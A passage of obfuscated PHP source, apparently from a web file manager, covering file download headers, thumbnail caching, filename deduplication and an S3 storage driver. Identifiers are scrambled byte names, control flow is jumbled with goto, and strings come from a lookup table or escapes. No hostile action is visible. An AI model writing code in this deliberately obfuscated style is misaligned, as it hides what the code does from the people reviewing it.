$dÒŸ¨ïù¦); header($BÀ£±÷ë¬è[134]); goto f·°¯·ê«; BÈïƒ„æ¿š: if (in_array($F øšÑ­”, array($BÀ£±÷ë¬è[108], $BÀ£±÷ë¬è[109], $BÀ£±÷ë¬è[110], $BÀ£±÷ë¬è[111]))) { $F øšÑ­” = $BÀ£±÷ë¬è[112]; } if (!$e§—ãİæÒ) { $e§—ãİæÒ = md5($cÒíĞÚ®–© . $this->hashSimple($c „êŠ©Œ)); } $e§—ãİæÒ = $BÀ£±÷ë¬è[113] . $e§—ãİæÒ . $BÀ£±÷ë¬è[113]; goto F‡èÕ—–’; EøÏ•Àçƒä: $B·…„íÇ½‹ = 0; $E¡ğ‘ƒÄ×… = $aöˆÎë¼ÃÒ - 1; $F øšÑ­” = $this->ext($dÒŸ¨ïù¦); goto BÈïƒ„æ¿š; f·°¯·ê«: header($BÀ£±÷ë¬è[135] . $aöˆÎë¼ÃÒ); header($BÀ£±÷ë¬è[136]); if (!$cÊóÙ¬…¸› && $F øšÑ­” == $BÀ£±÷ë¬è[137]) { if ($aöˆÎë¼ÃÒ > 1024 * 1024 * 5) { die; } $dàĞ·±§› = $this->getContent($c „êŠ©Œ); $dàĞ·±§› = Html::clearSVG($dàĞ·±§›); header($BÀ£±÷ë¬è[138] . $aöˆÎë¼ÃÒ); echo $dàĞ·±§›; die; } goto e°‹‚¤“»™; e¾ëÁ¾ç™í: $Fò˜½íÅœ = rawurlencode($dÒŸ¨ïù¦); $Fò˜½íÅœ = $BÀ£±÷ë¬è[113] . $Fò˜½íÅœ . $BÀ£±÷ë¬è[117] . $Fò˜½íÅœ; if ($cÊóÙ¬…¸›) { header($BÀ£±÷ë¬è[118]); header($BÀ£±÷ë¬è[119] . $Fò˜½íÅœ); } else { header($BÀ£±÷ë¬è[120] . $Fò˜½íÅœ); } goto dêã¥¨àÃ; dêã¥¨àÃ: header($BÀ£±÷ë¬è[121]); header($BÀ£±÷ë¬è[122] . $FÑ Ê‚æ‚); header($BÀ£±÷ë¬è[123] . gmdate($BÀ£±÷ë¬è[106], time() + 3600 * 24 * 30) . $BÀ£±÷ë¬è[124]); goto AŒ±É¡½; A¿Í¶¿²êˆ: $aöˆÎë¼ÃÒ = $bßËâäç‘õ[$BÀ£±÷ë¬è[77]]; $cÒíĞÚ®–© = gmdate($BÀ£±÷ë¬è[106], $bßËâäç‘õ[$BÀ£±÷ë¬è[107]]); $dÒŸ¨ïù¦ = $cƒ¢³„ƒÌÄ ? $cƒ¢³„ƒÌÄ : $this->iconvApp($bßËâäç‘õ[$BÀ£±÷ë¬è[28]]); goto EøÏ•Àçƒä; bÖ‹á¸îÎÕ: $BÀ£±÷ë¬è =& $_SERVER[¬ˆÚÂ”Éğä]; $this->cacheMethod(null, null); if (!$c „êŠ©Œ || !$this->exist($c „êŠ©Œ)) { show_json(LNG($BÀ£±÷ë¬è[101]), !1, $cƒ¢³„ƒÌÄ); } goto FôÚ¹ØŒğ§; F‡èÕ—–’: $FÑ Ê‚æ‚ = get_file_mime($F øšÑ­”); if (strstr($FÑ Ê‚æ‚, $BÀ£±÷ë¬è[114])) { $FÑ Ê‚æ‚ = $FÑ Ê‚æ‚ . $BÀ£±÷ë¬è[115]; } if ($cÊóÙ¬…¸› === !1 && !mime_support($FÑ Ê‚æ‚)) { $cÊóÙ¬…¸› = !0; $FÑ Ê‚æ‚ = $BÀ£±÷ë¬è[116]; } goto e¾ëÁ¾ç™í; b†÷Ò¥¤ù: $bß—ä²±º = !0; if ($_SERVER[$BÀ£±÷ë¬è[151]] == $BÀ£±÷ë¬è[152] && $aöˆÎë¼ÃÒ > 1204 * 1024 * 1024 * 2) { $bß—ä²±º = !1; } if ($bß—ä²±º) { header($BÀ£±÷ë¬è[153] . ($E¡ğ‘ƒÄ×… - $B·…„íÇ½‹ + 1)); } goto Eó‚ğÏù‘“; e°‹‚¤“»™: $cÏõ…Î±åó = strtolower($_SERVER[$BÀ£±÷ë¬è[139]]); if ($dœ—·œ”Çè && $cÏõ…Î±åó && $c¾æ‚ËÔ’É) { if (strstr($cÏõ…Î±åó, $BÀ£±÷ë¬è[140])) { header($BÀ£±÷ë¬è[141] . $c „êŠ©Œ); } else { if (strstr($cÏõ…Î±åó, $BÀ£±÷ë¬è[142])) { header($BÀ£±÷ë¬è[143] . $c „êŠ©Œ); } else { if (strstr($cÏõ…Î±åó, $BÀ£±÷ë¬è[144])) { header($BÀ£±÷ë¬è[145] . $c „êŠ©Œ); } } } if ($e‹¦íøâ¹ù) { header($BÀ£±÷ë¬è[146] . $e‹¦íøâ¹ù); } return; } if (isset($_SERVER[$BÀ£±÷ë¬è[147]])) { if (preg_match($BÀ£±÷ë¬è[148], $_SERVER[$BÀ£±÷ë¬è[147]], $aìÊ„ÕÑß)) { $B·…„íÇ½‹ = intval($aìÊ„ÕÑß[1]); if (!empty($aìÊ„ÕÑß[2])) { $E¡ğ‘ƒÄ×… = intval($aìÊ„ÕÑß[2]); } } header($BÀ£±÷ë¬è[149]); header("\103\x6f\x6e\x74\145\x6e\x74\x2d\122\141\x6e\x67\x65\x3a\40\x62\171\x74\x65\163\40{$B·…„íÇ½‹}\x2d{$E¡ğ‘ƒÄ×…}\57" . $aöˆÎë¼ÃÒ); } else { header($BÀ£±÷ë¬è[150]); } goto b†÷Ò¥¤ù; AÓì’âÈÎö: } public function fileOutServer($B•¥òğô¹, $a‡Ì¡ÔˆÎ‚ = false, $E©¥ÊÈµ‚ = false, $b¸’ÖØòÅ‰ = '') { $this->fileOut($B•¥òğô¹, $a‡Ì¡ÔˆÎ‚, $E©¥ÊÈµ‚, $b¸’ÖØòÅ‰); } public function fileOutLink($bˆæÑéŒ) { header($_SERVER[¬ˆÚÂ”Éğä][156] . $bˆæÑéŒ); die; } public function cacheMethod($B†÷†Ì—”, $FÒ„ÂïÓÈ’) { goto Dí’…„Œàƒ; b“¼¡­íÔ¹: $c‚Ëãˆ§µæ = isset($d²äˆëÆ›·[$f£âÎäé‹¿]) ? $d²äˆëÆ›·[$f£âÎäé‹¿] : null; if (!is_null($c‚Ëãˆ§µæ)) { return $c‚Ëãˆ§µæ; } $c‚Ëãˆ§µæ = $this->{$B†÷†Ì—”}($FÒ„ÂïÓÈ’); goto f²’™ÖØËÓ; Dí’…„Œàƒ: $D•ğ™â­„Æ =& $_SERVER[¬ˆÚÂ”Éğä]; static $d²äˆëÆ›· = array(); $CË‡¬¨ ê¤ = $FÒ„ÂïÓÈ’ ? ltrim($this->getPathOuter($FÒ„ÂïÓÈ’), $D•ğ™â­„Æ[8]) : $FÒ„ÂïÓÈ’; goto cÃ¦¦„±ò; f²’™ÖØËÓ: $d²äˆëÆ›·[$f£âÎäé‹¿] = $c‚Ëãˆ§µæ; return $c‚Ëãˆ§µæ; goto D˜­…Œø Ò; cÃ¦¦„±ò: $f£âÎäé‹¿ = $D•ğ™â­„Æ[157] . $B†÷†Ì—” . $D•ğ™â­„Æ[158] . rtrim($CË‡¬¨ ê¤, $D•ğ™â­„Æ[8]); if (is_null($B†÷†Ì—”)) { $d²äˆëÆ›· = array(); return; } if (is_null($FÒ„ÂïÓÈ’)) { unset($d²äˆëÆ›·[$f£âÎäé‹¿]); return; } goto b“¼¡­íÔ¹; D˜­…Œø Ò: } public function fileOutImage($BÆìôÀĞÜ, $Cªîİ‡ÔÒ¯ = 250) { goto C¾ÎÏÀ„øÑ; c±ÉƒñÈÏŒ: if ($BÜñòÕÚòã[$DÓ“ç’â³™[77]] <= 1024 * 50 || !function_exists($DÓ“ç’â³™[159]) || $BÜñòÕÚòã[$DÓ“ç’â³™[160]] == $DÓ“ç’â³™[161]) { return $this->fileOut($BÆìôÀĞÜ); } if (isset($BÜñòÕÚòã[$DÓ“ç’â³™[162]][$DÓ“ç’â³™[163]])) { $BÃ†ççè¤Ò = $BÜñòÕÚòã[$DÓ“ç’â³™[162]][$DÓ“ç’â³™[163]]; } else { if (isset($BÜñòÕÚòã[$DÓ“ç’â³™[162]][$DÓ“ç’â³™[164]])) { $BÃ†ççè¤Ò = $BÜñòÕÚòã[$DÓ“ç’â³™[162]][$DÓ“ç’â³™[164]]; } else { $BÃ†ççè¤Ò = md5("{$BÜñòÕÚòã[$DÓ“ç’â³™[28]]}\x5f{$BÜñòÕÚòã[$DÓ“ç’â³™[75]]}\137{$BÜñòÕÚòã[$DÓ“ç’â³™[77]]}"); } } $d¨Şˆ®®º = "{$BÃ†ççè¤Ò}\137{$Cªîİ‡ÔÒ¯}\56\160\x6e\147"; goto eÅˆÒêÑ; C¾ÎÏÀ„øÑ: $DÓ“ç’â³™ =& $_SERVER[¬ˆÚÂ”Éğä]; if (substr($BÆìôÀĞÜ, 0, 4) == $DÓ“ç’â³™[144]) { $this->fileOutLink($BÆìôÀĞÜ); } $BÜñòÕÚòã = $this->info($BÆìôÀĞÜ); goto c±ÉƒñÈÏŒ; FÜà³ë­š„: if (!($AäŞ†ˆ®¡ = IO::move($cÇ„— —¹¸, $Fß­×ãÄŒ¡))) { return IO::fileOut($cÇ„— —¹¸); } del_file($cÇ„— —¹¸); IO::fileOut($AäŞ†ˆ®¡); goto f”­Æè§İÊ; eÅˆÒêÑ: if (!($E›Ò‘×”£ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $DÓ“ç’â³™[165]))) { $Fß­×ãÄŒ¡ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $DÓ“ç’â³™[166]); } else { $Fß­×ãÄŒ¡ = KodIO::make($E›Ò‘×”£); } if ($E›Ò‘×”£ = IO::fileNameExist($Fß­×ãÄŒ¡, $d¨Şˆ®®º)) { $cÇ„— —¹¸ = KodIO::make($E›Ò‘×”£); return IO::fileOut($cÇ„— —¹¸); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D‘ŸÑ•ÍÀâ; D‘ŸÑ•ÍÀâ: $cÇ„— —¹¸ = DATA_THUMB . $d¨Şˆ®®º; if (!@file_exists($cÇ„— —¹¸)) { $fŞ…Á¼¿Œí = TEMP_FILES; if (!is_dir($fŞ…Á¼¿Œí)) { mk_dir($fŞ…Á¼¿Œí); } $D–¶‚¯–× = $fŞ…Á¼¿Œí . $BÃ†ççè¤Ò . $DÓ“ç’â³™[91] . $BÜñòÕÚòã[$DÓ“ç’â³™[160]]; if (!@file_exists($D–¶‚¯–×)) { $D–¶‚¯–× = $this->download($BÆìôÀĞÜ, $D–¶‚¯–×); } $BÏØÈ¼Å«À = new ImageThumb($D–¶‚¯–×, $DÓ“ç’â³™[167]); $BÏØÈ¼Å«À->prorate($cÇ„— —¹¸, $Cªîİ‡ÔÒ¯, $Cªîİ‡ÔÒ¯ * 10); } if (!file_exists($cÇ„— —¹¸) || filesize($cÇ„— —¹¸) < 100) { return @file_exists($D–¶‚¯–×) ? IO::fileOut($D–¶‚¯–×) : $this->fileOut($BÆìôÀĞÜ); } goto FÜà³ë­š„; f”­Æè§İÊ: } public function fileOutImageServer($fæùÎÒÈÏÚ, $B”É¦«‰Ê = 250) { $this->fileOutImage($fæùÎÒÈÏÚ, $B”É¦«‰Ê); } public function fileNameAuto($D×àÌ„Ùñê, $aÃ¶Åãí´, $D±È‡øÍã… = REPEAT_RENAME, $a™îÛÅîŞâ = false) { goto f­®‰Âõó; f­®‰Âõó: $cñò•‹Ï‘Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $AŠÁÍ°éø… = $D×àÌ„Ùñê === $cñò•‹Ï‘Æ[33] ? $aÃ¶Åãí´ : rtrim($D×àÌ„Ùñê, $cñò•‹Ï‘Æ[8]) . $cñò•‹Ï‘Æ[8] . $aÃ¶Åãí´; if ($D±È‡øÍã… == REPEAT_REPLACE || !$this->exist($AŠÁÍ°éø…) || $a™îÛÅîŞâ && $D±È‡øÍã… != REPEAT_RENAME_FOLDER) { return $aÃ¶Åãí´; } goto AŞ¿ã”“òø; AªÕìŒƒ°: $c£Æ¶¥³Ş‹ = 1; $eØ›¶—Ë»Ö = substr($aÃ¶Åãí´, 0, strlen($aÃ¶Åãí´) - strlen($DİëŸöàñ)); $Fˆ¼×ï¯¼ä = $eØ›¶—Ë»Ö . "\x28{$c£Æ¶¥³Ş‹}\x29{$DİëŸöàñ}"; goto A‚Á¨¦³¢ğ; AŞ¿ã”“òø: if ($D±È‡øÍã… == REPEAT_SKIP) { return !1; } $DİëŸöàñ = $cñò•‹Ï‘Æ[91] . get_path_ext($aÃ¶Åãí´); $DİëŸöàñ = $DİëŸöàñ == $cñò•‹Ï‘Æ[91] || $a™îÛÅîŞâ ? $cñò•‹Ï‘Æ[33] : $DİëŸöàñ; goto AªÕìŒƒ°; A‚Á¨¦³¢ğ: while ($this->exist(rtrim($D×àÌ„Ùñê, $cñò•‹Ï‘Æ[8]) . $cñò•‹Ï‘Æ[8] . $Fˆ¼×ï¯¼ä)) { $Fˆ¼×ï¯¼ä = $eØ›¶—Ë»Ö . "\x28{$c£Æ¶¥³Ş‹}\51{$DİëŸöàñ}"; $c£Æ¶¥³Ş‹++; } return $Fˆ¼×ï¯¼ä; goto e„ˆÅ„÷Ì ; e„ˆÅ„÷Ì : } public function listAllFiles($a©Ï«¸Ë°È, $C…Ÿ×î…¾, $AŸ½Ë¬ÇÇ = array()) { goto aÒé¦ê¯¯•; eˆ¥ì‡²ùÛ: $a©Ï«¸Ë°È = trim($a©Ï«¸Ë°È, $cÃÄŒ”…Û‘[8]); foreach ($C…Ÿ×î…¾ as $dß „çã…Å) { $a›Ì™Šœ›Ó = ltrim(substr($dß „çã…Å, strlen($a©Ï«¸Ë°È)), $cÃÄŒ”…Û‘[8]); $B°Ù ‚æ¹ = array_merge($B°Ù ‚æ¹, $this->slicePath($a›Ì™Šœ›Ó)); } $b¶•Ê¶´ = array(); goto BîºÕ…ª„Ş; aÒé¦ê¯¯•: $cÃÄŒ”…Û‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($C…Ÿ×î…¾)) { return array(); } $B°Ù ‚æ¹ = array(); goto eˆ¥ì‡²ùÛ; BîºÕ…ª„Ş: foreach (array_unique($B°Ù ‚æ¹) as $dß „çã…Å) { $e±‘’ë¯Ä = array($cÃÄŒ”…Û‘[75] => $this->getPathOuter($cÃÄŒ”…Û‘[8] . $a©Ï«¸Ë°È . $cÃÄŒ”…Û‘[8] . $dß „çã…Å), $cÃÄŒ”…Û‘[76] => 1, $cÃÄŒ”…Û‘[77] => 0); if (substr($dß „çã…Å, -1) != $cÃÄŒ”…Û‘[8]) { $e±‘’ë¯Ä[$cÃÄŒ”…Û‘[76]] = 0; $b‡”ø¿™í = $this->getPath($a©Ï«¸Ë°È . $cÃÄŒ”…Û‘[8] . $dß „çã…Å); $e±‘’ë¯Ä[$cÃÄŒ”…Û‘[77]] = isset($AŸ½Ë¬ÇÇ[$b‡”ø¿™í]) ? $AŸ½Ë¬ÇÇ[$b‡”ø¿™í] : $this->size($b‡”ø¿™í); } $b¶•Ê¶´[] = $e±‘’ë¯Ä; } return $b¶•Ê¶´; goto cŞÔ¤Ÿ˜Ó; cŞÔ¤Ÿ˜Ó: } public function slicePath($AÚ”®ÓØ†) { $e°÷¼éö‚Æ =& $_SERVER[¬ˆÚÂ”Éğä]; $B˜™ğÏÂä’ = explode($e°÷¼éö‚Æ[8], trim($AÚ”®ÓØ†, $e°÷¼éö‚Æ[8])); $BÙä…‚œ“ƒ = 0; do { ++$BÙä…‚œ“ƒ; $B–Ò‚ÛÍ·ß[] = implode($e°÷¼éö‚Æ[8], array_slice($B˜™ğÏÂä’, 0, $BÙä…‚œ“ƒ)) . $e°÷¼éö‚Æ[8]; } while ($BÙä…‚œ“ƒ < count($B˜™ğÏÂä’)); $B–Ò‚ÛÍ·ß[count($B˜™ğÏÂä’) - 1] = $AÚ”®ÓØ†; return $B–Ò‚ÛÍ·ß; } public function getHost() { $DœÉ˜Ï¢±‡ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÁ›¨Éê‹ = parse_url(trim($this->domain, $DœÉ˜Ï¢±‡[8])); $bŠÓŠ”¶×× = isset($DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[168]]) ? $DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[168]] : http_type(); $c°ÆêÎ÷² = isset($DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[169]]) ? $DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[169]] : $DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[75]]; if (isset($DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[170]])) { $c°ÆêÎ÷² .= $DœÉ˜Ï¢±‡[4] . $DÁ›¨Éê‹[$DœÉ˜Ï¢±‡[170]]; } return $bŠÓŠ”¶×× . $DœÉ˜Ï¢±‡[171] . $c°ÆêÎ÷²; } public function pathEncode($bó¶›¹¥Ñ) { $C¤ïØñÌˆá =& $_SERVER[¬ˆÚÂ”Éğä]; return str_replace($C¤ïØñÌˆá[172], $C¤ïØñÌˆá[8], rawurlencode($bó¶›¹¥Ñ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($AÓòµÕÍÀæ) { set_timeout(); require_once SDK_DIR . $_SERVER[¬ˆÚÂ”Éğä][173]; parent::__construct(); $this->_init($AÓòµÕÍÀæ); } public function _init($cª»«ƒˆçë) { foreach ($cª»«ƒˆçë as $c´´àã¬§ => $fãµë±˜‚) { if (isset($this->{$c´´àã¬§})) { $this->{$c´´àã¬§} = $fãµë±˜‚; } } $this->endpoint = $cª»«ƒˆçë[$_SERVER[¬ˆÚÂ”Éğä][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($c®ÑÉÊ‰Æ¥ = "\x76\x34") { $this->signVer = $c®ÑÉÊ‰Æ¥; $this->client->setSignatureVersion($c®ÑÉÊ‰Æ¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto CŞôŠ¼Ğ²‘; CŞôŠ¼Ğ²‘: $E®·ˆ¥˜™ =& $_SERVER[¬ˆÚÂ”Éğä]; $E Š‚÷§™© = $this->getBucketCors(); if (!$E Š‚÷§™© || !is_array($E Š‚÷§™©)) { return !1; } goto c¯»ºÌ¶¯—; EØ­·ß÷¬…: $bá’Ãç¨Êì = array($E®·ˆ¥˜™[180], $E®·ˆ¥˜™[181], $E®·ˆ¥˜™[182], $E®·ˆ¥˜™[183], $E®·ˆ¥˜™[184]); $f—ñ³Š¬¼• = array_diff($bá’Ãç¨Êì, $B±è×§·á‹); return empty($f—ñ³Š¬¼•); goto e§ŒÖØÁ‡; c¯»ºÌ¶¯—: if ($E Š‚÷§™©[$E®·ˆ¥˜™[175]] != $E®·ˆ¥˜™[176] || $E Š‚÷§™©[$E®·ˆ¥˜™[177]] != $E®·ˆ¥˜™[176]) { return !1; } $B±è×§·á‹ = array_map($E®·ˆ¥˜™[178], $E Š‚÷§™©[$E®·ˆ¥˜™[179]]); if (!is_array($B±è×§·á‹)) { $B±è×§·á‹ = array(); } goto EØ­·ß÷¬…; e§ŒÖØÁ‡: } public function mkfile($aÙÊ¸…ŸÓÒ, $eˆÆÁšÀÔÍ = '', $BÂîíÛö» = REPEAT_RENAME) { $D¯ÕöÌï”ã = $this->setContent($aÙÊ¸…ŸÓÒ, $eˆÆÁšÀÔÍ); if ($D¯ÕöÌï”ã !== !1) { return $this->getPathOuter($aÙÊ¸…ŸÓÒ); } return !1; } public function mkdir($Dší¶œ­Ì, $Aá¼Şââ³ = REPEAT_SKIP) { if (empty($Dší¶œ­Ì)) { return !1; } if ($this->_isFolder($Dší¶œ­Ì)) { return $this->getPathOuter($Dší¶œ­Ì); } $a„¯„º‚²‰ = $this->setContent($Dší¶œ­Ì, $_SERVER[¬ˆÚÂ”Éğä][33], !0); if ($a„¯„º‚²‰ !== !1) { return $this->getPathOuter($Dší¶œ­Ì); } return !1; } public function copyFile($e§²‡òİ ¡, $c±…Ñƒ‚¿Ê, $a§ğËô¶—Å = array()) { $F°òåï—ßø =& $_SERVER[¬ˆÚÂ”Éğä]; $aù†İå³Î = $this->objectMeta($e§²‡òİ ¡); if (!$aù†İå³Î) { return !1; } if ($aù†İå³Î[$F°òåï—ßø[77]] <= 1024 * 1024 * 200) { $b—¬›Ù¼ŠÜ = $this->client->copyObject($this->bucket, $e§²‡òİ ¡, $this->bucket, $c±…Ñƒ‚¿Ê, $F°òåï—ßø[185], $a§ğËô¶—Å); } else { $b—¬›Ù¼ŠÜ = $this->client->multiCopyObject($this->bucket, $e§²‡òİ ¡, $this->bucket, $c±…Ñƒ‚¿Ê, $a§ğËô¶—Å); } $b—¬›Ù¼ŠÜ = $b—¬›Ù¼ŠÜ ? $this->getPathOuter($c±…Ñƒ‚¿Ê) : !1; return $b—¬›Ù¼ŠÜ; } public function moveFile($bÄöÔõ÷¦, $AÚŒŒ©Í•) { if ($this->copyFile($bÄöÔõ÷¦, $AÚŒŒ©Í•)) { $this->delFile($bÄöÔõ÷¦); return $this->getPathOuter($AÚŒŒ©Í•); } return !1; } public function delFile($Cê®¬ù¦ƒà) { return $this->client->deleteObject($this->bucket, $Cê®¬ù¦ƒà); } public function delFolder($f‚ÄøÄ²‰ø) { goto EÕŠ¦¸ã„Š; A´±‰Å•§‘: $D¶µ“ôÆ¡ = $däƒ¼Ûø™Œ = 0; $C®™¶†ª¸ë = array_chunk(array_keys($b´±ñéÎÇó), 1000); foreach ($C®™¶†ª¸ë as $CŠßõ¢ö«–) { $D¶µ“ôÆ¡++; $däƒ¼Ûø™Œ += (int) $this->client->deleteObjects($this->bucket, $CŠßõ¢ö«–); } goto f¼¸ë˜ˆŒ¨; EÕŠ¦¸ã„Š: $A‚ÂÚ†ÌÌ =& $_SERVER[¬ˆÚÂ”Éğä]; $b´±ñéÎÇó = $this->listObjs($f‚ÄøÄ²‰ø); if (!$b´±ñéÎÇó) { $f‚ÄøÄ²‰ø = trim($f‚ÄøÄ²‰ø, $A‚ÂÚ†ÌÌ[8]); if (!empty($f‚ÄøÄ²‰ø)) { $f‚ÄøÄ²‰ø .= $A‚ÂÚ†ÌÌ[8]; } return $this->delFile($f‚ÄøÄ²‰ø); } goto A´±‰Å•§‘; f¼¸ë˜ˆŒ¨: return $D¶µ“ôÆ¡ === $däƒ¼Ûø™Œ ? !0 : !1; goto F„æëššÖ‰; F„æëššÖ‰: } public function rename($f„Ìîœ‰Øá, $cíç„å–È) { return $this->renameObject($f„Ìîœ‰Øá, $cíç„å–È); } public function listPath($fÑù£™õÊ, $CŒ¯¯ó¿‰Ø = false) { $BÂ©÷Ñ¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $bÕâÂÊÆ¼Ä = $this->listObjs($fÑù£™õÊ, null, null, $BÂ©÷Ñ¬[8]); $Cõø–¥ç¤° = array($BÂ©÷Ñ¬[74] => array(), $BÂ©÷Ñ¬[73] => array()); foreach ($bÕâÂÊÆ¼Ä as $c™ïó‚…İ => $a¾ÏÎãµ‹¤) { if ($c™ïó‚…İ == $BÂ©÷Ñ¬[8]) { continue; } if (isset($a¾ÏÎãµ‹¤[$BÂ©÷Ñ¬[186]])) { $Cõø–¥ç¤°[$BÂ©÷Ñ¬[74]][] = $this->folderInfo($a¾ÏÎãµ‹¤[$BÂ©÷Ñ¬[186]], $CŒ¯¯ó¿‰Ø); } else { if (substr($a¾ÏÎãµ‹¤[$BÂ©÷Ñ¬[28]], -1) == $BÂ©÷Ñ¬[8]) { continue; } $Cõø–¥ç¤°[$BÂ©÷Ñ¬[73]][] = $this->fileInfo($a¾ÏÎãµ‹¤[$BÂ©÷Ñ¬[28]], $CŒ¯¯ó¿‰Ø, $a¾ÏÎãµ‹¤); } } return $Cõø–¥ç¤°; } private function fileInfo($bªÖÊ¦«”¿, $dš¯„—Ğ© = false, $d àÜÒ‹Šé = array()) { goto C•˜ğĞ˜ÈÌ; C•˜ğĞ˜ÈÌ: $bÜŒëÙ÷‚ª =& $_SERVER[¬ˆÚÂ”Éğä]; if ($dš¯„—Ğ©) { return array($bÜŒëÙ÷‚ª[28] => $this->pathThis($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[75] => $this->getPathOuter($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[29] => $bÜŒëÙ÷‚ª[167], $bÜŒëÙ÷‚ª[160] => $this->ext($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[77] => isset($d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[77]]) ? $d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[77]] : 0, $bÜŒëÙ÷‚ª[187] => 0, $bÜŒëÙ÷‚ª[107] => 0, $bÜŒëÙ÷‚ª[188] => !0, $bÜŒëÙ÷‚ª[189] => !0); } $aË«Ú÷óÚÉ = array($bÜŒëÙ÷‚ª[28] => $this->pathThis($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[75] => $this->getPathOuter($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[29] => $bÜŒëÙ÷‚ª[167], $bÜŒëÙ÷‚ª[187] => 0, $bÜŒëÙ÷‚ª[107] => 0, $bÜŒëÙ÷‚ª[77] => 0, $bÜŒëÙ÷‚ª[160] => $this->ext($bªÖÊ¦«”¿), $bÜŒëÙ÷‚ª[188] => !0, $bÜŒëÙ÷‚ª[189] => !0); goto fßßÑš; c†½óÖ¢è›: return $aË«Ú÷óÚÉ; goto F‡šÅ–ä¢’; fßßÑš: if (empty($d àÜÒ‹Šé)) { $d àÜÒ‹Šé = $this->objectMeta($bªÖÊ¦«”¿); if (!$d àÜÒ‹Šé) { return $aË«Ú÷óÚÉ; } } if (isset($d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[190]])) { $aË«Ú÷óÚÉ[$bÜŒëÙ÷‚ª[107]] = $d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[190]]; } if (isset($d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[77]])) { $aË«Ú÷óÚÉ[$bÜŒëÙ÷‚ª[77]] = $d àÜÒ‹Šé[$bÜŒëÙ÷‚ª[77]]; } goto c†½óÖ¢è›; F‡šÅ–ä¢’: } private function folderInfo($A¿Ø¹“œ°÷, $C„¹ÈÍ¹ = false) { goto AĞëÎ“ÓšÈ; AĞëÎ“ÓšÈ: $DŠÅƒÂÜÈ» =& $_SERVER[¬ˆÚÂ”Éğä]; if ($C„¹ÈÍ¹) { return array($DŠÅƒÂÜÈ»[28] => $this->pathThis($A¿Ø¹“œ°÷), $DŠÅƒÂÜÈ»[75] => $this->getPathOuter($DŠÅƒÂÜÈ»[8] . $A¿Ø¹“œ°÷), $DŠÅƒÂÜÈ»[29] => $DŠÅƒÂÜÈ»[76], $DŠÅƒÂÜÈ»[188] => !0, $DŠÅƒÂÜÈ»[189] => !0); } $D°ƒÑïñŞ± = array($DŠÅƒÂÜÈ»[28] => $this->pathThis($A¿Ø¹“œ°÷), $DŠÅƒÂÜÈ»[75] => $this->getPathOuter($DŠÅƒÂÜÈ»[8] . $A¿Ø¹“œ°÷), $DŠÅƒÂÜÈ»[29] => $DŠÅƒÂÜÈ»[76], $DŠÅƒÂÜÈ»[187] => 0, $DŠÅƒÂÜÈ»[107] => 0, $DŠÅƒÂÜÈ»[188] => !0, $DŠÅƒÂÜÈ»[189] => !0); goto Bß³†™ä‹; Bß³†™ä‹: if ($A¿Ø¹“œ°÷ == $DŠÅƒÂÜÈ»[33]) { return $D°ƒÑïñŞ±; } $A¿Ø¹“œ°÷ = trim($A¿Ø¹“œ°÷, $DŠÅƒÂÜÈ»[8]) . $DŠÅƒÂÜÈ»[8]; $c‚•Ä³ = $this->objectMeta($A¿Ø¹“œ°÷); goto d°¥´àÙÛƒ; d°¥´àÙÛƒ: if (isset($c‚•Ä³[$DŠÅƒÂÜÈ»[190]])) { $D°ƒÑïñŞ±[$DŠÅƒÂÜÈ»[187]] = $c‚•Ä³[$DŠÅƒÂÜÈ»[190]]; } return $D°ƒÑïñŞ±; goto c¼å·Ğ˜—É; c¼å·Ğ˜—É: } public function listObjs($FÙ¹µî°á´, $dñØâ†¦” = null, $bí¿ºßáÂî = null, $eÛÓøÄø†ä = null) { $A²äõ®½İƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÙ¹µî°á´ = trim($FÙ¹µî°á´, $A²äõ®½İƒ[8]); $d‡Ùî¸î… = empty($FÙ¹µî°á´) ? $A²äõ®½İƒ[33] : $FÙ¹µî°á´ . $A²äõ®½İƒ[8]; return $this->client->getBucket($this->bucket, $d‡Ùî¸î…, $dñØâ†¦”, $bí¿ºßáÂî, $eÛÓøÄø†ä, !0); } public function has($EØ¥ÔäŒ²ƒ, $bšˆ‘÷âÇ = false, $AœïËØÁ¤ = true) { goto A¥òÚÖˆ¨; A¥òÚÖˆ¨: $bçË’Ô‘Ëª =& $_SERVER[¬ˆÚÂ”Éğä]; $Dá”¼¼‰ï° = 0; $c£ùÊ ¼À = 0; goto FØÃÕÊ›Ú; dÔ¿Â™Æ‡†: if ($bšˆ‘÷âÇ) { return array($bçË’Ô‘Ëª[191] => $Dá”¼¼‰ï°, $bçË’Ô‘Ëª[192] => $c£ùÊ ¼À); } return !1; goto aß‹„çå½; FØÃÕÊ›Ú: $d„¨Ÿ¾¤Ç = $this->listObjs($EØ¥ÔäŒ²ƒ, null, null, $bçË’Ô‘Ëª[8]); $d„¨Ÿ¾¤Ç = 